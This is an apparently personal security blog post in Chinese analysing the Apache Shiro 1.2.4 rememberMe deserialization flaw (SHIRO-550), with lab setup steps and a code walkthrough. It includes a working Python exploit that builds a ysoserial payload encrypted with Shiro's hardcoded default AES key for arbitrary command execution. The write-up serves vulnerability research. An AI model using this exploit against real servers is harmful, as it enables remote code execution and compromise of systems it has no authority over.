---
title: "Shiro rememberMe 反序列化分析"
date: 2020-04-29T11:49:36+08:00
draft: false
tags:
- java
- shiro
- 反序列化
series:
-
categories:
- 代码审计
---

Shiro 550
<!--more-->
## 复现
```bash
git clone https://github.com/apache/shiro.git
git checkout shiro-root-1.2.4
```
然后导入maven项目之后，在`samples/web/pom.xml`配置jstl版本和反序列化用到的gadget链依赖。

```xml
<properties>
    <maven.compiler.source>1.6</maven.compiler.source>
    <maven.compiler.target>1.6</maven.compiler.target>
</properties>
<dependency>
    <groupId>javax.servlet</groupId>
    <artifactId>jstl</artifactId>
    <!-- 配置版本 -->
    <version>1.2</version>
    <scope>runtime</scope>
</dependency>
<!-- 依赖cc链 -->
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>
```

如果你爆了toolchains相关的错误，就在`C:\Users\username\.m2\toolchains.xml`配置toolchains

```xml
<?xml version="1.0" encoding="UTF8"?>
<toolchains>
    <toolchain>
        <type>jdk</type>
        <provides>
            <version>1.6</version>
            <vendor>sun</vendor>
        </provides>
        <configuration>
            <jdkHome>C:\Program Files\Java\jdk1.8.0_181</jdkHome>
        </configuration>
    </toolchain>
</toolchains>
```
maven package之后将war包放到tomcat7下部署，运行之后就是这样
![image.png](https://y4er.com/img/uploads/20200429117947.png)

使用[shiro_tool.jar](https://github.com/wyzxxz/shiro_rce)复现:
![image.png](https://y4er.com/img/uploads/20200429114017.png)


也可以使用python脚本

```python
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

def encode_rememberme(payload,command):
    popen = subprocess.Popen(['java', '-jar', '../ysoserial/ysoserial-0.0.6-SNAPSHOT-all.jar', payload, command], stdout=subprocess.PIPE)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode =  AES.MODE_CBC
    #iv   =  base64.b64decode(rememberMe)[:16]   
    iv = uuid.uuid4().bytes
    print(iv)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    print(sys.argv[1],sys.argv[2])
    payload = encode_rememberme(sys.argv[1],sys.argv[2])
    with open("payload.cookie", "w") as fpw:
        print("rememberMe={}".format(payload.decode()), file=fpw)
```
将文件中的贴到cookie中请求即可。

## 分析
首先要知道shiro是一个用来做身份验证的框架，其原理是基于servlet的filter进行的。在web.xml中定义了ShiroFilter，作用范围是当前目录下所有的url
![image.png](https://y4er.com/img/uploads/20200429118024.png)

cookie的处理在`CookieRememberMeManager`类，继承了`AbstractRememberMeManager`，在`AbstractRememberMeManager`中硬编码了加密密钥`DEFAULT_CIPHER_KEY_BYTES`
![image.png](https://y4er.com/img/uploads/20200429116644.png)

加密方式为AES对称加密，AES有了密钥还需要加密算法和初始化向量IV，`AbstractRememberMeManager`中加密函数调用了CipherService接口，实现其方法的是JcaCipherService类
![image.png](https://y4er.com/img/uploads/20200429113963.png)

在该类的encrypt()中发现IV自动生成，长度16个字节
![image.png](https://y4er.com/img/uploads/20200429110435.png)

并且加密模式为CBC
![image.png](https://y4er.com/img/uploads/20200429117537.png)

在encrypt中会先将IV写入
![image.png](https://y4er.com/img/uploads/20200429111239.png)

所以我们直接读原始cookie前16个字节获取。

最后一点就是在encrypt()中字节数组serialized在何处序列化和反序列化的？

serialized在convertPrincipalsToBytes()被赋值
![image.png](https://y4er.com/img/uploads/20200429113210.png)

可以看到是一个PrincipalCollection对象，而PrincipalCollection是一个接口，其实现类

![image.png](https://y4er.com/img/uploads/20200429112725.png)

仅有SimplePrincipalCollection实现了readObject，这也是反序列化的入口，但是在哪触发的？

在`org.apache.shiro.mgt.AbstractRememberMeManager#deserialize`中一步步跟进
![image.png](https://y4er.com/img/uploads/20200429117101.png)

最终找到了`org.apache.shiro.io.DefaultSerializer#deserialize`
![image.png](https://y4er.com/img/uploads/20200429119048.png)

到此为止

## 总结
因为AES硬编码的问题导致的RCE，自己对于加密与解密不是很了解，这方面有待学习。

## 参考
1. https://xz.aliyun.com/t/6493
2. https://xz.aliyun.com/t/7207
3. https://paper.seebug.org/shiro-rememberme-1-2-4/
4. https://issues.apache.org/jira/browse/SHIRO-550


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**